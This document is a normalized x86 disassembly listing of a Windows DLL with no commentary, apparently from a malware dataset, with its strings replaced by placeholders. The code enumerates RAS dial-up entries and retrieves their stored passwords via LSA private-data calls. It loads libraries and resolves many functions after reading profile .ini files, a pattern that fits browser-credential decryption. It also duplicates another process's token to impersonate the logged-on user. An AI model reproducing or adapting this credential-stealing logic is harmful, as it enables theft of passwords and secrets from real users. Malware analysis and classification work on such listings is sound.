lea eax [ ebp - 0x244 ]
push eax
call [ strcpy@IAT ]
push 0x5c
lea eax [ ebp - 0x244 ]
push eax
call [ strrchr@IAT ]
mov [ eax ] 0x0
lea eax [ ebp - 0x244 ]
push eax
call edi
mov ecx ebx
sub ecx eax
push ecx
push r--data
lea eax [ ebp - 0x244 ]
push eax
call [ strncat@IAT ]
lea eax [ ebp - 0x244 ]
push eax
call edi
mov ecx ebx
sub ecx eax
push ecx
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x244 ]
push eax
call [ strncat@IAT ]
add esp 0x30
jmp r-xdata
inc [ ebp - 0x248 ]
lea eax [ ebp - 0x140 ]
push eax
call edi
pop ecx
cmp [ ebp - 0x248 ] eax
jb r-xdata
mov [ eax ] 0x5c
inc [ ebp - 0x24c ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x244 ]
push eax
call [ esi + 0x32c ]
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x244 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x24c ]
push r--data
lea eax [ ebp - 0x3c ]
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ esi + 0x10 ]
push eax
push 0x0
push r--data
lea eax [ ebp - 0x3c ]
push eax
call [ GetPrivateProfileIntA@IAT ]
mov [ ebp - 0x254 ] eax
push ebx
push 0x0
lea eax [ ebp - 0x140 ]
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ esi + 0x10 ]
push eax
push 0x103
lea eax [ ebp - 0x140 ]
push eax
push r--data
push r--data
lea eax [ ebp - 0x3c ]
push eax
call [ GetPrivateProfileStringA@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
lea eax [ ebp - 0x244 ]
push eax
lea eax [ ebp - 0x140 ]
push eax
call [ strcpy@IAT ]
lea eax [ ebp - 0x140 ]
push eax
call edi
mov ecx ebx
sub ecx eax
push ecx
push r--data
lea eax [ ebp - 0x140 ]
push eax
call [ strncat@IAT ]
push 0x0
push 0x1
lea eax [ ebp - 0x250 ]
push eax
lea eax [ ebp - 0x140 ]
push eax
call [ esi + 0x350 ]
add esp 0x28
test eax eax
jne r-xdata
call [ esi + 0x330 ]
push eax
push esi
push sub_1000f433
push r--data
push [ ebp - 0x250 ]
call [ esi + 0x358 ]
push [ ebp - 0x250 ]
call [ esi + 0x354 ]
add esp 0x18
sub_1000f9cc
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi [ strcpy@IAT ]
lea eax [ esi + 0x218 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call edi
mov ebx [ strlen@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call ebx
mov ecx 0x104
sub ecx eax
push ecx
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ strncat@IAT ]
add esp 0x18
push 0x8
push 0x0
lea eax [ ebp - 0x108 ]
push eax
call [ LoadLibraryExA@IAT ]
mov [ esi + 0x31c ] eax
lea eax [ esi + 0x218 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call edi
lea eax [ ebp - 0x108 ]
push eax
call ebx
mov ecx 0x104
sub ecx eax
push ecx
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ strncat@IAT ]
add esp 0x18
push 0x8
push 0x0
lea eax [ ebp - 0x108 ]
push eax
call [ LoadLibraryExA@IAT ]
mov [ esi + 0x320 ] eax
lea eax [ esi + 0x218 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call edi
lea eax [ ebp - 0x108 ]
push eax
call ebx
mov ecx 0x104
sub ecx eax
push ecx
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ strncat@IAT ]
add esp 0x18
push 0x8
push 0x0
lea eax [ ebp - 0x108 ]
push eax
call [ LoadLibraryExA@IAT ]
mov [ esi + 0x324 ] eax
test eax eax
jne r-xdata
mov edi [ GetProcAddress@IAT ]
push r--data
push [ esi + 0x31c ]
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x32c ] eax
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x330 ] eax
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x334 ] eax
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x338 ] eax
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x340 ] eax
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x344 ] eax
call edi
push r--data
push [ esi + 0x31c ]
mov [ esi + 0x33c ] eax
call edi
push r--data
push [ esi + 0x324 ]
mov [ esi + 0x34c ] eax
call edi
push r--data
push [ esi + 0x324 ]
mov [ esi + 0x350 ] eax
call edi
push r--data
push [ esi + 0x324 ]
mov [ esi + 0x354 ] eax
call edi
push r--data
push [ esi + 0x320 ]
mov [ esi + 0x358 ] eax
call edi
xor ecx ecx
pop edi
mov [ esi + 0x348 ] eax
pop ebx
cmp [ esi + 0x32c ] ecx
je r-xdata
lea eax [ esi + 0x218 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
call edi
lea eax [ ebp - 0x108 ]
push eax
call ebx
mov ecx 0x104
sub ecx eax
push ecx
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ strncat@IAT ]
add esp 0x18
push 0x8
push 0x0
lea eax [ ebp - 0x108 ]
push eax
call [ LoadLibraryExA@IAT ]
mov [ esi + 0x324 ] eax
xor eax eax
cmp [ esi + 0x330 ] ecx
je r-xdata
cmp [ esi + 0x334 ] ecx
je r-xdata
cmp [ esi + 0x338 ] ecx
je r-xdata
cmp [ esi + 0x340 ] ecx
je r-xdata
cmp [ esi + 0x344 ] ecx
je r-xdata
cmp [ esi + 0x33c ] ecx
je r-xdata
cmp eax ecx
je r-xdata
cmp [ esi + 0x34c ] ecx
je r-xdata
cmp [ esi + 0x350 ] ecx
je r-xdata
cmp [ esi + 0x358 ] ecx
je r-xdata
cmp [ esi + 0x354 ] ecx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
sub_1000fc82
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0x118 ] 0x0
push ebx
push edi
mov edi [ RegOpenKeyExA@IAT ]
mov [ ebp - 0x11c ] eax
lea eax [ ebp - 0x10c ]
push eax
mov ebx 0x20019
push ebx
push 0x0
push r--data
push 0x80000002
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x118 ]
pop edi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x4
push esi
mov esi 0x100
push esi
push eax
lea eax [ ebp - 0x104 ]
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push 0x0
push r--data
push [ ebp - 0x10c ]
mov [ ebp - 0x110 ] esi
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x10c ]
call [ RegCloseKey@IAT ]
pop esi
cmp [ ebp - 0x108 ] 0x1
jne r-xdata
mov [ ebp - 0x5 ] al
lea eax [ ebp - 0x104 ]
push eax
call [ strlen@IAT ]
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0x104 ]
push r--data
push eax
call [ strncat@IAT ]
add esp 0x10
lea eax [ ebp - 0x114 ]
push eax
push ebx
xor ebx ebx
push ebx
lea eax [ ebp - 0x104 ]
push eax
push [ ebp - 0x10c ]
call edi
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x104 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push r--data
push [ ebp - 0x114 ]
mov [ ebp - 0x110 ] esi
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x114 ]
call [ RegCloseKey@IAT ]
xor esi esi
inc esi
cmp [ ebp - 0x108 ] esi
jne r-xdata
lea eax [ ebp - 0x104 ]
push eax
mov [ ebp - 0x5 ] bl
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x104
lea eax [ ebp - 0x104 ]
push eax
mov eax [ ebp - 0x11c ]
add eax 0x218
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x118 ] esi
sub_1000fe30
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
lea eax [ ebp - 0x10c ]
push eax
xor ebx ebx
push ebx
push 0x8
mov esi ecx
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x10c ]
mov [ ebp - 0x110 ] 0x104
call [ GetUserProfileDirectoryA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x10c ]
call [ CloseHandle@IAT ]
push edi
lea eax [ ebp - 0x108 ]
push eax
lea edi [ esi + 0x10 ]
push edi
call [ strcpy@IAT ]
mov esi [ strcat@IAT ]
push r--data
push edi
call esi
push r--data
push edi
call esi
push r--data
push edi
call esi
add esp 0x20
push edi
call [ GetFileAttributesA@IAT ]
pop edi
cmp eax 0xffffffff
je r-xdata
inc ebx
sub_1000fee9
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
call [ esi + 0x334 ]
mov ebx eax
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop ebx
leave
retn 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
push edi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
call [ esi + 0x344 ]
add esp 0xc
test eax eax
jne r-xdata
push ebx
call [ esi + 0x338 ]
pop ecx
push [ ebp - 0x8 ]
call [ malloc@IAT ]
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax edi
je r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call [ esi + 0x34c ]
pop ecx
pop ecx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push eax
call [ memcpy@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
add esp 0xc
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
sub_1000ff7a
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000f3f9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000ff9a
push 0x76c
push r--data
call sub_10014f80
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x764 ] eax
mov [ ebp - 0x760 ] 0x64
xor esi esi
mov [ ebp - 0x748 ] esi
push 0x200
push esi
lea eax [ ebp - 0x508 ]
push eax
call [ memset@IAT ]
add esp 0xc
mov [ ebp - 0x730 ] esi
mov [ ebp - 0x754 ] esi
mov [ ebp - 0x744 ] esi
mov [ ebp - 0x724 ] esi
mov [ ebp - 0x728 ] esi
mov [ ebp - 0x738 ] esi
call sub_1000768f
test eax eax
je r-xdata
lea eax [ ebp - 0x724 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
call sub_1000711a
and eax 0xffff0000
cmp eax 0x6000000
lea eax [ ebp - 0x728 ]
push eax
lea eax [ ebp - 0x724 ]
push eax
jb r-xdata
mov edi 0x418
mov [ ebp - 0x740 ] edi
push edi
push 0x40
mov ebx [ LocalAlloc@IAT ]
call ebx
mov [ ebp - 0x72c ] eax
mov [ eax ] edi
mov esi 0x838
push esi
push 0x40
call ebx
mov [ ebp - 0x73c ] eax
mov [ eax ] esi
lea eax [ ebp - 0x744 ]
push eax
lea eax [ ebp - 0x740 ]
push eax
push [ ebp - 0x72c ]
push 0x0
push 0x0
call [ RasEnumEntriesW@IAT ]
cmp eax 0x25b
jne r-xdata
lea eax [ ebp - 0x740 ]
push eax
push esi
push esi
push 0x1
push [ ebp - 0x724 ]
mov edi [ GetTokenInformation@IAT ]
call edi
test eax eax
jne r-xdata
call sub_10010970
call sub_100107a8
jmp r-xdata
lea eax [ ebp - 0x744 ]
push eax
lea eax [ ebp - 0x740 ]
push eax
push [ ebp - 0x72c ]
push 0x0
push 0x0
call [ RasEnumEntriesW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x72c ]
call [ LocalFree@IAT ]
push [ ebp - 0x73c ]
call [ LocalFree@IAT ]
push [ ebp - 0x740 ]
push 0x40
call ebx
mov [ ebp - 0x72c ] eax
mov [ eax ] edi
mov eax [ ebp - 0x744 ]
imul eax eax 0x838
push eax
push 0x40
call ebx
mov [ ebp - 0x73c ] eax
mov [ eax ] esi
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x724 ] esi
je r-xdata
pop ecx
pop ecx
mov [ ebp - 0x738 ] eax
jmp r-xdata
cmp [ ebp - 0x724 ] 0x0
je r-xdata
and [ ebp - 0x720 ] eax
cmp [ ebp - 0x744 ] eax
jbe r-xdata
push [ ebp - 0x740 ]
call [ malloc@IAT ]
pop ecx
mov ebx eax
cmp ebx esi
je r-xdata
cmp [ ebp - 0x508 ] 0x0
je r-xdata
cmp [ ebp - 0x738 ] 0x0
je r-xdata
mov eax [ ebp - 0x73c ]
mov [ ebp - 0x71c ] eax
mov ecx [ ebp - 0x72c ]
add ecx 0x4
mov [ ebp - 0x734 ] ecx
jmp r-xdata
lea eax [ ebp - 0x740 ]
push eax
push [ ebp - 0x740 ]
push ebx
push 0x1
push [ ebp - 0x724 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x730 ] 0x0
je r-xdata
push 0x18
pop esi
push esi
push 0x0
lea eax [ ebp - 0x77c ]
push eax
call [ memset@IAT ]
add esp 0xc
mov [ ebp - 0x77c ] esi
lea eax [ ebp - 0x720 ]
push eax
push 0x800
lea eax [ ebp - 0x77c ]
push eax
push 0x0
call [ LsaOpenPolicy@IAT ]
test eax eax
js r-xdata
push [ ebp - 0x724 ]
call [ CloseHandle@IAT ]
push [ ebp - 0x728 ]
push [ ebp - 0x724 ]
call sub_10010950
pop ecx
pop ecx
jmp r-xdata
mov [ eax ] esi
push [ ebp - 0x734 ]
add eax 0x4
push eax
call [ wcscpy@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x75c ]
push eax
push [ ebp - 0x71c ]
push 0x0
call [ RasGetEntryDialParamsW@IAT ]
inc [ ebp - 0x720 ]
add [ ebp - 0x734 ] edi
add [ ebp - 0x71c ] esi
mov eax [ ebp - 0x720 ]
cmp eax [ ebp - 0x744 ]
jb r-xdata
push ebx
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x720 ]
push eax
push [ ebx ]
call [ ConvertSidToStringSidW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x73c ] 0x0
je r-xdata
and [ ebp - 0x71c ] 0x0
lea eax [ ebp - 0x508 ]
push eax
push r--data
push 0x100
lea eax [ ebp - 0x308 ]
push eax
call [ _snwprintf@IAT ]
xor eax eax
mov [ ebp - 0x10a ] ax
lea eax [ ebp - 0x308 ]
mov [ ebp - 0x74c ] eax
push eax
mov edi [ wcslen@IAT ]
call edi
add esp 0x14
add eax eax
mov [ ebp - 0x74e ] ax
mov [ ebp - 0x750 ] ax
lea eax [ ebp - 0x734 ]
push eax
lea eax [ ebp - 0x750 ]
push eax
push [ ebp - 0x720 ]
mov esi [ LsaRetrievePrivateData@IAT ]
call esi
mov [ ebp - 0x728 ] eax
push r--data
lea eax [ ebp - 0x308 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x308 ]
mov [ ebp - 0x74c ] eax
push eax
call edi
add esp 0xc
add eax eax
mov [ ebp - 0x74e ] ax
mov [ ebp - 0x750 ] ax
lea eax [ ebp - 0x738 ]
push eax
lea eax [ ebp - 0x750 ]
push eax
push [ ebp - 0x720 ]
call esi
mov esi eax
cmp [ ebp - 0x728 ] 0x0
jl r-xdata
mov eax [ ebp - 0x71c ]
push 0x100
push [ ebp - 0x720 ]
lea eax [ ebp - 0x508 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ ebp - 0x30a ] ax
push [ ebp - 0x720 ]
call [ LocalFree@IAT ]
cmp [ ebp - 0x72c ] 0x0
je r-xdata
push [ ebp - 0x73c ]
call [ LocalFree@IAT ]
xor ecx ecx
push ecx
push ecx
push 0x104
lea edx [ ebp - 0x610 ]
push edx
push 0xffffffff
imul eax eax 0x838
mov edi [ ebp - 0x73c ]
lea eax [ eax + edi + 0x4 ]
push eax
push ecx
push 0xfde9
mov ebx [ WideCharToMultiByte@IAT ]
call ebx
xor esi esi
push esi
push esi
push 0x104
lea eax [ ebp - 0x718 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x71c ]
imul eax eax 0x418
mov ecx [ ebp - 0x72c ]
lea eax [ eax + ecx + 0x20c ]
push eax
push esi
push 0x1
call ebx
lea eax [ ebp - 0x718 ]
push eax
push esi
push r--data
lea eax [ ebp - 0x610 ]
push eax
call [ GetPrivateProfileIntA@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
xor ecx ecx
mov eax [ ebp - 0x734 ]
movzx ecx [ eax ]
jmp r-xdata
cmp [ ebp - 0x730 ] 0x0
je r-xdata
push [ ebp - 0x72c ]
call [ LocalFree@IAT ]
inc [ ebp - 0x71c ]
jmp r-xdata
push 0x80
push esi
lea eax [ ebp - 0xa0 ]
push eax
call [ memset@IAT ]
add esp 0xc
push ebx
push r--data
push 0x34
lea eax [ ebp - 0x108 ]
push eax
call [ _snwprintf@IAT ]
add esp 0x10
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x730 ]
xor eax eax
mov eax [ ebp - 0x738 ]
movzx eax [ eax ]
jmp r-xdata
test esi esi
js r-xdata
mov eax [ ebp - 0x748 ]
call sub_10014fc8
retn
push [ ebp - 0x730 ]
call [ LocalFree@IAT ]
mov eax [ ebp - 0x71c ]
cmp eax [ ebp - 0x744 ]
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
push esi
mov ebx [ wcscmp@IAT ]
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ ebp - 0x730 ] 0x0
add eax 0x2
push eax
push 0x40
call ebx
mov [ ebp - 0x730 ] eax
jmp r-xdata
add eax ecx
mov [ ebp - 0x754 ] eax
je r-xdata
mov ebx [ ebp - 0x748 ]
cmp ebx [ ebp - 0x760 ]
jae r-xdata
add esi 0x2
jmp r-xdata
cmp esi [ ebp - 0x728 ]
jae r-xdata
cmp [ ebp - 0x728 ] 0x0
jl r-xdata
mov eax edi
cmp [ ebp - 0x728 ] 0x0
jl r-xdata
mov edi [ ebp - 0x730 ]
test edi edi
je r-xdata
mov esi ebx
imul esi esi 0x380
add esi [ ebp - 0x764 ]
push r--data
push esi
call [ wcscpy@IAT ]
mov eax [ ebp - 0x71c ]
imul eax eax 0x838
add edi eax
push 0x100
lea eax [ edi + 0x4 ]
push eax
lea eax [ esi + 0x80 ]
push eax
call [ wcsncpy@IAT ]
add esp 0x14
push 0x40
add edi 0x40a
push edi
lea eax [ esi + 0x280 ]
push eax
mov edi [ wcsncpy@IAT ]
call edi
add esp 0xc
push 0x40
lea eax [ ebp - 0xa0 ]
push eax
add esi 0x300
push esi
call edi
add esp 0xc
inc ebx
mov [ ebp - 0x748 ] ebx
mov [ ebp - 0x758 ] esi
mov eax [ ebp - 0x754 ]
shr eax 0x1
mov ecx [ ebp - 0x730 ]
lea eax [ ecx + eax * 2 ]
mov [ ebp - 0x728 ] eax
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x71c ]
imul eax eax 0x838
lea eax [ eax + edi + 0x40a ]
mov [ ebp - 0x75c ] eax
push eax
push esi
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
test esi esi
js r-xdata
push [ ebp - 0x734 ]
call [ LsaFreeMemory@IAT ]
test esi esi
js r-xdata
mov eax [ ebp - 0x734 ]
movzx ecx [ eax ]
push ecx
push [ eax + 0x4 ]
push edi
call [ memcpy@IAT ]
add esp 0xc
mov eax [ ebp - 0x734 ]
movzx eax [ eax ]
add eax edi
add esi 0x2
mov [ ebp - 0x758 ] esi
jmp r-xdata
push 0x40
push [ ebp - 0x75c ]
call [ wcslen@IAT ]
pop ecx
lea eax [ esi + eax * 2 + 0x2 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ ebp - 0x22 ] ax
push [ ebp - 0x720 ]
call [ LsaClose@IAT ]
push [ ebp - 0x738 ]
call [ LsaFreeMemory@IAT ]
mov ecx [ ebp - 0x738 ]
movzx edx [ ecx ]
push edx
push [ ecx + 0x4 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
sub_100106ce
push ebp
mov ebp esp
sub esp 0x10
fld [ r--data ]
push esi
xor esi esi
fstp [ ebp - 0x10 ]
push esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x20019
push esi
push esi
push esi
push r--data
push 0x80000002
call [ RegCreateKeyExW@IAT ]
test eax eax
jne r-xdata
fld [ ebp - 0x10 ]
pop esi
leave
retn
push edi
lea eax [ ebp - 0x8 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
push esi
mov esi [ RegQueryValueExW@IAT ]
mov edi r--data
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebx
push [ ebp - 0x8 ]
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
push eax
push 0x0
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push ebx
call [ free@IAT ]
pop ecx
mov esi [ wcschr@IAT ]
push 0x2e
pop edi
push edi
push ebx
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
call [ _wtof@IAT ]
fstp [ ebp - 0x10 ]
pop ecx
push edi
push ebx
call esi
push edi
push eax
call esi
add esp 0x10
test eax eax
je r-xdata
push edi
push ebx
call esi
push edi
push eax
call esi
add esp 0x10
xor ecx ecx
mov [ eax ] cx
sub_100107a8
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
mov esi r--data
xor ebx ebx
push esi
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x78 ] ebx
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
push r--data
call sub_100073da
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
push r--data
push edi
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x70 ]
push ecx
push [ ebp - 0x78 ]
call eax
test eax eax
je r-xdata
mov edi [ GetTokenInformation@IAT ]
lea eax [ ebp - 0x74 ]
push eax
push ebx
push ebx
xor ebx ebx
inc ebx
push ebx
push [ ebp - 0x70 ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x70 ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0x74 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x74 ]
push esi
push ebx
push [ ebp - 0x70 ]
call edi
test eax eax
jne r-xdata
push 0x32
pop eax
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push [ esi ]
push 0x0
call [ LookupAccountSidA@IAT ]
push esi
test eax eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
call [ free@IAT ]
push 0x20
pop esi
push esi
lea eax [ ebp - 0xa8 ]
push 0x0
push eax
call [ memset@IAT ]
lea eax [ ebp - 0x38 ]
add esp 0x10
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
push [ ebp - 0x70 ]
mov [ ebp - 0xa8 ] esi
mov [ ebp - 0xa4 ] ebx
call [ LoadUserProfileA@IAT ]
push [ ebp - 0x70 ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
mov ecx [ ebp - 0x7c ]
mov [ ecx ] eax
mov eax [ ebp - 0x8c ]
mov ecx [ ebp - 0x80 ]
mov [ ecx ] eax
mov eax ebx
jmp r-xdata
push [ ebp - 0x8c ]
push [ ebp - 0x70 ]
call [ UnloadUserProfile@IAT ]
push [ ebp - 0x8c ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
sub_10010970
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc ]
push edi
xor ebx ebx
push r--data
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x70 ] ebx
call sub_10007497
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
push eax
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x74 ]
push eax
push 0xf01ff
push esi
call [ OpenProcessToken@IAT ]
push esi
test eax eax
jne r-xdata
mov esi [ CloseHandle@IAT ]
call esi
lea eax [ ebp - 0x70 ]
push eax
push 0x1
push 0x2
push ebx
push 0x2000000
push [ ebp - 0x74 ]
call [ DuplicateTokenEx@IAT ]
push [ ebp - 0x74 ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
call esi
call esi
mov edi [ GetTokenInformation@IAT ]
lea eax [ ebp - 0x78 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x70 ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x70 ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0x78 ]
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0x7c ] eax
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x78 ]
push ecx
push [ ebp - 0x78 ]
push eax
push 0x1
push [ ebp - 0x70 ]
call edi
test eax eax
jne r-xdata
mov edi [ ebp - 0x7c ]
push 0x32
pop eax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x88 ] eax
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push [ edi ]
push ebx
call [ LookupAccountSidA@IAT ]
push edi
test eax eax
je r-xdata
push [ ebp - 0x7c ]
call [ free@IAT ]
pop ecx
call [ free@IAT ]
push 0x20
pop edi
push edi
lea eax [ ebp - 0xb0 ]
push ebx
push eax
call [ memset@IAT ]
lea eax [ ebp - 0x38 ]
add esp 0x10
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xb0 ] edi
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp - 0x70 ]
xor edi edi
inc edi
mov [ ebp - 0xac ] edi
call [ LoadUserProfileA@IAT ]
push [ ebp - 0x70 ]
test eax eax
je r-xdata
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
mov ecx [ ebp - 0x84 ]
mov [ ecx ] eax
mov eax [ ebp - 0x94 ]
mov ecx [ ebp - 0x8c ]
mov [ ecx ] eax
mov eax edi
jmp r-xdata
push [ ebp - 0x94 ]
push [ ebp - 0x70 ]
call [ UnloadUserProfile@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
sub_10010b38
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ memset@IAT ]
push edi
mov [ ebp - 0x228 ] eax
mov eax [ ebp + 0xc ]
push 0x24
mov [ ebp - 0x224 ] eax
xor ebx ebx
lea eax [ ebp - 0x24c ]
push ebx
push eax
mov [ ebp - 0x104 ] 0x0
